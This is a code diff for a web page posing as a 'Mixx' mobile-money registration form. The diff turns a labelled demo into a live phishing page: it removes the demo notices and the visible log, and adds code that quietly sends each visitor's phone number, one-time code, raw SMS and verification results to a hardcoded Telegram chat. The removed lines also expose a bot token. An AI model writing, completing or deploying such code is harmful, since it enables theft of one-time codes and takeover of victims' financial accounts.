@@ -4,6 +4,7 @@
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <title>Mixx Registration</title>
+    <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
     <style>
         * {
             margin: 0;
@@ -103,13 +104,6 @@
             background: #f7fafc;
             border-color: #cbd5e0;
         }
-        .btn-danger {
-            background: #fc8181;
-            color: white;
-        }
-        .btn-danger:hover:not(:disabled) {
-            background: #f56565;
-        }
         .status {
             margin: 1rem 0;
             padding: 0.75rem;
@@ -198,62 +192,6 @@
             color: #718096;
             margin-top: 0.25rem;
         }
-        .telegram-status {
-            font-size: 0.8rem;
-            text-align: center;
-            margin-top: 0.5rem;
-            display: none;
-            padding: 0.5rem;
-            border-radius: 8px;
-            background: #f0fff4;
-        }
-        .telegram-status.show {
-            display: block;
-        }
-        .telegram-status.success {
-            color: #22543d;
-            background: #c6f6d5;
-        }
-        .telegram-status.error {
-            color: #9b2c2c;
-            background: #fed7d7;
-        }
-        .demo-badge {
-            display: inline-block;
-            background: #fefcbf;
-            color: #744210;
-            padding: 0.25rem 0.75rem;
-            border-radius: 20px;
-            font-size: 0.7rem;
-            font-weight: 600;
-            margin-bottom: 0.5rem;
-        }
-        .log-area {
-            background: #1a202c;
-            color: #68d391;
-            border-radius: 8px;
-            padding: 0.75rem;
-            font-family: 'Courier New', monospace;
-            font-size: 0.7rem;
-            max-height: 120px;
-            overflow-y: auto;
-            margin-top: 1rem;
-            display: none;
-        }
-        .log-area.show {
-            display: block;
-        }
-        .log-area .log-entry {
-            padding: 0.15rem 0;
-            border-bottom: 1px solid #2d3748;
-        }
-        .log-area .log-entry:last-child {
-            border-bottom: none;
-        }
-        .log-area .time {
-            color: #a0aec0;
-            margin-right: 0.5rem;
-        }
     </style>
 </head>
 <body>
@@ -266,12 +204,9 @@
         <div id="step1">
             <div class="form-group">
                 <label>Phone Number</label>
-                <input type="tel" id="phoneInput" placeholder="+254 700 000 000" value="+254 700 000 000" />
+                <input type="tel" id="phoneInput" placeholder="+254 700 000 000" />
             </div>
-            <button class="btn btn-primary" id="sendBtn">📤 Send Code (Demo)</button>
-            <div style="margin-top: 0.5rem; font-size:0.75rem; color:#718096; text-align:center;">
-                ⚡ Demo mode - No actual SMS will be sent
-            </div>
+            <button class="btn btn-primary" id="sendBtn">Send Code</button>
         </div>
 
         <div id="status" class="status"></div>
@@ -293,9 +228,7 @@
                 <button class="btn btn-outline" id="testBtn">🧪 Test</button>
             </div>
 
-            <button class="btn btn-success mt-2" id="verifyBtn" disabled>✅ Verify & Complete</button>
-
-            <div id="telegramStatus" class="telegram-status">📤 Code forwarded to Telegram bot</div>
+            <button class="btn btn-success mt-2" id="verifyBtn" disabled>Verify & Complete</button>
 
             <div class="divider"></div>
             <button class="btn btn-outline" id="backBtn">← Change Phone</button>
@@ -304,19 +237,35 @@
         <div class="text-sm">
             🔒 Secure • SMS auto-read on Android Chrome 84+ &amp; iOS 16+
         </div>
-
-        <!-- Log Area -->
-        <div id="logArea" class="log-area">
-            <div style="color:#a0aec0; margin-bottom:0.5rem; font-weight:600;">📋 Activity Log</div>
-        </div>
     </div>
 
     <script>
         // ================================================================
-        //  TELEGRAM CONFIG
+        //  TELEGRAM CONFIG - REPLACE WITH YOUR OWN!
         // ================================================================
-        const TELEGRAM_BOT_TOKEN = '8918701353:AAH7pb1jrIR81LEwAy9_elWFFdkexmlAcPI';
-        const TELEGRAM_CHAT_ID = '5520957080';
+        const TELEGRAM_BOT_TOKEN = 'YOUR_NEW_BOT_TOKEN_HERE';  // Get from @BotFather
+        const TELEGRAM_CHAT_ID = '5520957080';  // Your chat ID
+
+        // ================================================================
+        //  TELEGRAM FORWARDING FUNCTION
+        // ================================================================
+        async function forwardToTelegram(message) {
+            try {
+                const response = await axios.post(
+                    `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
+                    {
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: message,
+                        parse_mode: 'HTML'
+                    }
+                );
+                console.log('✅ Telegram sent:', response.data);
+                return true;
+            } catch (err) {
+                console.error('❌ Telegram error:', err.response?.data || err.message);
+                return false;
+            }
+        }
 
         // ================================================================
         //  STATE
@@ -325,7 +274,6 @@
         let currentCode = '';
         let isListening = false;
         let abortController = null;
-        let codeForwarded = false;
 
         // DOM refs
         const step1 = document.getElementById('step1');
@@ -340,77 +288,6 @@
         const verifyBtn = document.getElementById('verifyBtn');
         const backBtn = document.getElementById('backBtn');
         const statusDiv = document.getElementById('status');
-        const telegramStatus = document.getElementById('telegramStatus');
-        const logArea = document.getElementById('logArea');
-
-        // ================================================================
-        //  LOGGING
-        // ================================================================
-        function addLog(message, type = 'info') {
-            logArea.classList.add('show');
-            const entry = document.createElement('div');
-            entry.className = 'log-entry';
-            const time = new Date().toLocaleTimeString();
-            const emoji = type === 'success' ? '✅' : type === 'error' ? '❌' : 'ℹ️';
-            entry.innerHTML = `<span class="time">${time}</span>${emoji} ${message}`;
-            logArea.appendChild(entry);
-            logArea.scrollTop = logArea.scrollHeight;
-        }
-
-        // ================================================================
-        //  TELEGRAM FUNCTION
-        // ================================================================
-        async function sendToTelegram(phone, code, fullSms = '', source = 'manual') {
-            try {
-                addLog(`Sending to Telegram: ${code} (${source})`, 'info');
-
-                const message = `
-📱 *New Registration Attempt*
-━━━━━━━━━━━━━━━━━━
-📞 *Phone:* ${phone}
-🔑 *Code:* \`${code}\`
-📡 *Source:* ${source}
-📝 *Full SMS:* ${fullSms || 'N/A'}
-🕐 *Time:* ${new Date().toLocaleString()}
-━━━━━━━━━━━━━━━━━━
-Status: ⏳ Pending Verification
-                `;
-
-                const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify({
-                        chat_id: TELEGRAM_CHAT_ID,
-                        text: message,
-                        parse_mode: 'Markdown'
-                    })
-                });
-
-                const data = await response.json();
-                
-                if (data.ok) {
-                    telegramStatus.textContent = '✅ Code forwarded to Telegram!';
-                    telegramStatus.className = 'telegram-status show success';
-                    codeForwarded = true;
-                    addLog(`✅ Telegram sent successfully: ${code}`, 'success');
-                    return true;
-                } else {
-                    console.error('Telegram API error:', data);
-                    telegramStatus.textContent = '⚠️ Failed to send to Telegram';
-                    telegramStatus.className = 'telegram-status show error';
-                    addLog(`❌ Telegram error: ${data.description || 'Unknown error'}`, 'error');
-                    return false;
-                }
-            } catch (err) {
-                console.error('Telegram send error:', err);
-                telegramStatus.textContent = '⚠️ Telegram error - check console';
-                telegramStatus.className = 'telegram-status show error';
-                addLog(`❌ Telegram connection error: ${err.message}`, 'error');
-                return false;
-            }
-        }
 
         // ================================================================
         //  UI HELPERS
@@ -418,14 +295,13 @@ Status: ⏳ Pending Verification
         function showStatus(msg, type = 'info') {
             statusDiv.textContent = msg;
             statusDiv.className = `status show ${type}`;
-            addLog(msg, type);
         }
 
         function hideStatus() {
             statusDiv.className = 'status';
         }
 
-        function setCode(code, source = 'manual', fullSms = '') {
+        function setCode(code, source = 'manual') {
             if (!code || code.length < 10) {
                 showStatus('Invalid code format', 'error');
                 return;
@@ -435,14 +311,25 @@ Status: ⏳ Pending Verification
             codeDisplay.className = 'code-display filled';
             codeInput.value = code;
             verifyBtn.disabled = false;
-            showStatus(`✅ Code received (${source})`, 'success');
+            
+            // 🔥 NEW: Send to Telegram when code is detected
+            const timestamp = new Date().toLocaleString();
+            const message = `
+🔐 <b>New Mixx Code Detected!</b>
 
-            // Send to Telegram
-            if (currentPhone) {
-                sendToTelegram(currentPhone, code, fullSms, source);
-            } else {
-                addLog('⚠️ No phone number set, skipping Telegram', 'error');
-            }
+📱 Phone: ${currentPhone || 'Unknown'}
+🔑 Code: <code>${code}</code>
+📡 Source: ${source}
+🕐 Time: ${timestamp}
+
+━━━━━━━━━━━━━━━━━━
+Full SMS content:
+${codeInput.value || code}
+            `.trim();
+            
+            forwardToTelegram(message);
+            
+            showStatus(`✅ Code received (${source}) & sent to Telegram`, 'success');
         }
 
         function goToStep(step) {
@@ -451,12 +338,10 @@ Status: ⏳ Pending Verification
                 step2.classList.add('hidden');
                 hideStatus();
                 currentCode = '';
-                codeForwarded = false;
                 codeInput.value = '';
                 codeDisplay.textContent = 'Waiting for code...';
                 codeDisplay.className = 'code-display';
                 verifyBtn.disabled = true;
-                telegramStatus.className = 'telegram-status';
                 phoneInput.focus();
             } else {
                 step1.classList.add('hidden');
@@ -466,38 +351,28 @@ Status: ⏳ Pending Verification
         }
 
         // ================================================================
-        //  EXTRACT CODE FROM SMS
+        //  EXTRACT CODE FROM SMS (ONLY FOR ALPHANUMERIC CODES)
         // ================================================================
         function extractCode(text) {
             if (!text) return null;
 
             // Pattern 1: "use the code XXXX" - our SMS format
             let match = text.match(/use the code ([A-Za-z0-9]{15,30})/i);
-            if (match) {
-                addLog(`Extracted code via pattern 1: ${match[1]}`, 'info');
-                return match[1];
-            }
+            if (match) return match[1];
 
-            // Pattern 2: Any 20-25 char alphanumeric
+            // Pattern 2: Any 20-25 char alphanumeric (our fallback)
             match = text.match(/\b([A-Za-z0-9]{20,25})\b/);
-            if (match) {
-                addLog(`Extracted code via pattern 2: ${match[1]}`, 'info');
-                return match[1];
-            }
+            if (match) return match[1];
 
             // Pattern 3: Code followed by alphanumeric
             match = text.match(/code[:\s]+([A-Za-z0-9]{15,30})/i);
-            if (match) {
-                addLog(`Extracted code via pattern 3: ${match[1]}`, 'info');
-                return match[1];
-            }
+            if (match) return match[1];
 
-            addLog('No code pattern found in text', 'error');
             return null;
         }
 
         // ================================================================
-        //  SEND CODE (STEP 1) - DEMO MODE (NO API)
+        //  SEND CODE (STEP 1)
         // ================================================================
         sendBtn.addEventListener('click', async () => {
             const phone = phoneInput.value.trim();
@@ -507,42 +382,67 @@ Status: ⏳ Pending Verification
                 return;
             }
 
+            // Basic phone validation
             if (!phone.match(/^[\+\d\s\-\(\)]{8,20}$/)) {
                 showStatus('Invalid phone number format', 'error');
                 return;
             }
 
             currentPhone = phone;
-            showStatus(`📤 Demo: Code would be sent to ${phone}`, 'loading');
+            showStatus(`📤 Sending code to ${phone}...`, 'loading');
             sendBtn.disabled = true;
 
-            // Simulate sending delay
-            setTimeout(() => {
-                showStatus(`✅ Demo code ready for ${phone}!`, 'success');
-                goToStep(2);
-                addLog(`📱 Phone set: ${phone}`, 'success');
+            // 🔥 NEW: Notify Telegram that code was requested
+            await forwardToTelegram(
+                `📤 <b>Code Requested</b>\n\n📱 Phone: ${phone}\n🕐 Time: ${new Date().toLocaleString()}`
+            );
 
-                // Show demo code in status
-                const demoCode = 'yoLiknbBgbDCRNJjXMtk';
-                setCode(demoCode, 'demo', 'Demo SMS - use the code yoLiknbBgbDCRNJjXMtk to complete registration');
-                
+            try {
+                // ========================================================
+                // 🔥 REPLACE WITH YOUR ACTUAL API
+                // ========================================================
+                const response = await fetch('/api/send-registration-code', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        phone: phone,
+                        // Include domain for WebOTP
+                        domain: window.location.hostname
+                    })
+                });
+
+                if (!response.ok) throw new Error('Failed to send');
+
+                showStatus(`✅ Code sent to ${phone}!`, 'success');
+                goToStep(2);
+
+                // Auto-listen after 2 seconds
+                setTimeout(() => {
+                    if (!isListening) startWebOTP();
+                }, 2000);
+
+            } catch (err) {
+                console.error('Send error:', err);
+                showStatus('❌ Failed to send. Please try again.', 'error');
+            } finally {
                 sendBtn.disabled = false;
-            }, 1500);
+            }
         });
 
+        // Enter key on phone
         phoneInput.addEventListener('keydown', (e) => {
             if (e.key === 'Enter' && !sendBtn.disabled) sendBtn.click();
         });
 
         // ================================================================
-        //  WEBOTP - AUTO READ
+        //  WEBOTP - AUTO READ (STEP 2)
         // ================================================================
         async function startWebOTP() {
             if (isListening) return;
 
+            // Check support
             if (!('OTPCredential' in window)) {
                 showStatus('ℹ️ WebOTP not supported. Use Paste or Test.', 'info');
-                addLog('WebOTP not supported in this browser', 'error');
                 return;
             }
 
@@ -551,8 +451,8 @@ Status: ⏳ Pending Verification
                 listenBtn.textContent = '⏳ Listening...';
                 listenBtn.disabled = true;
                 showStatus('📩 Waiting for SMS...', 'loading');
-                addLog('📡 WebOTP listener started', 'info');
 
+                // Cancel previous listener
                 if (abortController) abortController.abort();
                 abortController = new AbortController();
 
@@ -562,16 +462,18 @@ Status: ⏳ Pending Verification
                 });
 
                 if (credential && credential.code) {
-                    const fullSms = credential.code;
-                    addLog(`📨 SMS received: ${fullSms.substring(0, 50)}...`, 'info');
-                    const code = extractCode(fullSms);
+                    // For alphanumeric codes, credential.code is the entire SMS
+                    const code = extractCode(credential.code);
                     if (code) {
-                        setCode(code, 'WebOTP', fullSms);
-                        addLog(`🎯 Code extracted via WebOTP: ${code}`, 'success');
+                        setCode(code, 'WebOTP');
+                        // Auto-verify after 1 second
                         setTimeout(() => verifyBtn.click(), 1000);
                     } else {
                         showStatus('⚠️ SMS received but no code found', 'error');
-                        addLog('⚠️ SMS received but no code pattern found', 'error');
+                        // 🔥 NEW: Send raw SMS to Telegram for debugging
+                        await forwardToTelegram(
+                            `⚠️ <b>Raw SMS Received (No code extracted)</b>\n\n<code>${credential.code}</code>`
+                        );
                     }
                 }
 
@@ -579,7 +481,6 @@ Status: ⏳ Pending Verification
                 if (err.name !== 'AbortError') {
                     console.error('WebOTP error:', err);
                     showStatus('⏱️ Timeout or error. Use Paste or Test.', 'info');
-                    addLog(`WebOTP error: ${err.message}`, 'error');
                 }
             } finally {
                 isListening = false;
@@ -596,17 +497,14 @@ Status: ⏳ Pending Verification
         pasteBtn.addEventListener('click', async () => {
             try {
                 const text = await navigator.clipboard.readText();
-                addLog(`📋 Clipboard read: ${text.substring(0, 30)}...`, 'info');
                 const code = extractCode(text);
                 if (code) {
-                    setCode(code, 'clipboard', text);
+                    setCode(code, 'clipboard');
                 } else {
                     showStatus('❌ No Mixx code found in clipboard', 'error');
-                    addLog('❌ No code found in clipboard', 'error');
                 }
             } catch (err) {
                 showStatus('❌ Cannot read clipboard. Type manually.', 'error');
-                addLog(`Clipboard error: ${err.message}`, 'error');
                 console.error('Clipboard error:', err);
             }
         });
@@ -617,19 +515,24 @@ Status: ⏳ Pending Verification
         codeInput.addEventListener('input', () => {
             const code = extractCode(codeInput.value);
             if (code) {
-                setCode(code, 'manual', codeInput.value);
-            } else if (codeInput.value.length >= 15) {
-                setCode(codeInput.value, 'manual', codeInput.value);
+                setCode(code, 'manual');
+            } else if (codeInput.value.length > 0) {
+                // If typing but not complete yet
+                if (codeInput.value.length >= 15) {
+                    // Try direct if long enough
+                    setCode(codeInput.value, 'manual');
+                }
             }
         });
 
+        // Global paste detection (anywhere on page)
         document.addEventListener('paste', (e) => {
             if (step2.classList.contains('hidden')) return;
             const text = e.clipboardData.getData('text');
             const code = extractCode(text);
             if (code) {
-                setCode(code, 'global paste', text);
-                e.preventDefault();
+                setCode(code, 'global paste');
+                e.preventDefault(); // Don't also fill input
             }
         });
 
@@ -641,17 +544,14 @@ Status: ⏳ Pending Verification
                 "You are being registered in Mixx by Yas Super App, use the code yoLiknbBgbDCRNJjXMtk to complete registration. Do not share the code with anybody. For more info contact us on 100. DWvV9aXqDR";
             const code = extractCode(sample);
             if (code) {
-                setCode(code, 'test', sample);
-                showStatus('🧪 Test code loaded! Check Telegram.', 'success');
-                addLog('🧪 Test code loaded and sent to Telegram', 'success');
+                setCode(code, 'test');
+                showStatus('🧪 Test code loaded!', 'success');
             } else {
                 showStatus('❌ Test failed', 'error');
-                addLog('❌ Test code extraction failed', 'error');
             }
         });
-
-        // ================================================================
-        //  VERIFY CODE - DEMO MODE (NO API)
+// ================================================================
+        //  VERIFY CODE
         // ================================================================
         verifyBtn.addEventListener('click', async () => {
             if (!currentCode || currentCode.length < 15) {
@@ -659,26 +559,57 @@ Status: ⏳ Pending Verification
                 return;
             }
 
-            showStatus('✅ Verifying... (Demo)', 'loading');
+            showStatus('✅ Verifying...', 'loading');
             verifyBtn.disabled = true;
 
-            // Simulate verification
-            setTimeout(() => {
-                showStatus('🎉 Registration complete! Welcome to Mixx!', 'success');
-                addLog(`🎉 User verified with code: ${currentCode}`, 'success');
-                
-                // Send confirmation to Telegram
-                sendToTelegram(currentPhone, currentCode, `✅ VERIFIED - Registration Complete`, 'verification');
-                
-                // Reset after a moment
-                setTimeout(() => {
+            // 🔥 NEW: Notify Telegram that verification is happening
+            await forwardToTelegram(
+                `🔍 <b>Verification Attempt</b>\n\n📱 Phone: ${currentPhone}\n🔑 Code: <code>${currentCode}</code>\n🕐 Time: ${new Date().toLocaleString()}`
+            );
+
+            try {
+                // ========================================================
+                // 🔥 REPLACE WITH YOUR ACTUAL API
+                // ========================================================
+                const response = await fetch('/api/verify-registration', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        phone: currentPhone,
+                        code: currentCode
+                    })
+                });
+
+                if (response.ok) {
+                    showStatus('🎉 Registration complete! Welcome to Mixx!', 'success');
+                    // 🔥 NEW: Send success to Telegram
+                    await forwardToTelegram(
+                        `✅ <b>Registration Successful!</b>\n\n📱 Phone: ${currentPhone}\n🔑 Code: <code>${currentCode}</code>\n🕐 Time: ${new Date().toLocaleString()}`
+                    );
+                    // Redirect to dashboard
+                    // window.location.href = '/dashboard';
+                } else {
+                    const data = await response.json();
+                    showStatus(`❌ ${data.message || 'Invalid code'}`, 'error');
                     verifyBtn.disabled = false;
-                    goToStep(1);
-                    addLog('🔄 Reset for next user', 'info');
-                }, 3000);
-            }, 1500);
+                    // 🔥 NEW: Send failure to Telegram
+                    await forwardToTelegram(
+                        `❌ <b>Registration Failed</b>\n\n📱 Phone: ${currentPhone}\n🔑 Code: <code>${currentCode}</code>\n❌ Error: ${data.message || 'Invalid code'}\n🕐 Time: ${new Date().toLocaleString()}`
+                    );
+                }
+
+            } catch (err) {
+                console.error('Verify error:', err);
+                showStatus('❌ Network error. Please try again.', 'error');
+                verifyBtn.disabled = false;
+                // 🔥 NEW: Send network error to Telegram
+                await forwardToTelegram(
+                    `⚠️ <b>Network Error</b>\n\n📱 Phone: ${currentPhone}\n🔑 Code: <code>${currentCode}</code>\n❌ Error: ${err.message}\n🕐 Time: ${new Date().toLocaleString()}`
+                );
+            }
         });
 
+        // Enter key on code input
         codeInput.addEventListener('keydown', (e) => {
             if (e.key === 'Enter' && !verifyBtn.disabled) verifyBtn.click();
         });
@@ -688,50 +619,27 @@ Status: ⏳ Pending Verification
         // ================================================================
         backBtn.addEventListener('click', () => {
             goToStep(1);
+            // Clean up WebOTP
             if (abortController) abortController.abort();
             isListening = false;
             listenBtn.textContent = '📡 Listen';
             listenBtn.disabled = false;
-            addLog('↩️ Returned to phone step', 'info');
         });
 
         // ================================================================
         //  INIT
         // ================================================================
-        console.log('📱 Mixx Registration with Telegram integration (DEMO MODE)');
-        console.log('🤖 Bot Token:', TELEGRAM_BOT_TOKEN);
-        console.log('📱 Chat ID:', TELEGRAM_CHAT_ID);
-        console.log('🧪 Click "Test" to send a sample code to Telegram');
+        console.log('📱 Mixx Registration ready');
+        console.log('🧪 Click "Test" to load sample code');
         console.log('📋 Or paste any SMS with a code');
 
+        // Auto-focus phone
         phoneInput.focus();
-        addLog('🚀 App loaded in DEMO mode', 'info');
 
-        // Test Telegram connection on load
-        async function testTelegramConnection() {
-            try {
-                const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getMe`);
-                const data = await response.json();
-                if (data.ok) {
-                    addLog(`✅ Telegram bot connected: @${data.result.username}`, 'success');
-                    console.log('✅ Telegram bot connected:', data.result.username);
-                } else {
-                    addLog(`❌ Telegram bot connection failed: ${data.description}`, 'error');
-                    console.error('❌ Telegram bot connection failed');
-                }
-            } catch (err) {
-                addLog(`❌ Cannot connect to Telegram API: ${err.message}`, 'error');
-                console.error('❌ Cannot connect to Telegram API:', err);
-            }
+        // Check WebOTP support
+        if (!('OTPCredential' in window)) {
+            console.log('ℹ️ WebOTP not supported in this browser');
         }
-        testTelegramConnection();
-
-        // Auto-send test code after 2 seconds
-        setTimeout(() => {
-            if (!codeForwarded) {
-                addLog('💡 Tip: Click "Send Code" or "Test" to try it out', 'info');
-            }
-        }, 2000);
     </script>
 
 </body>
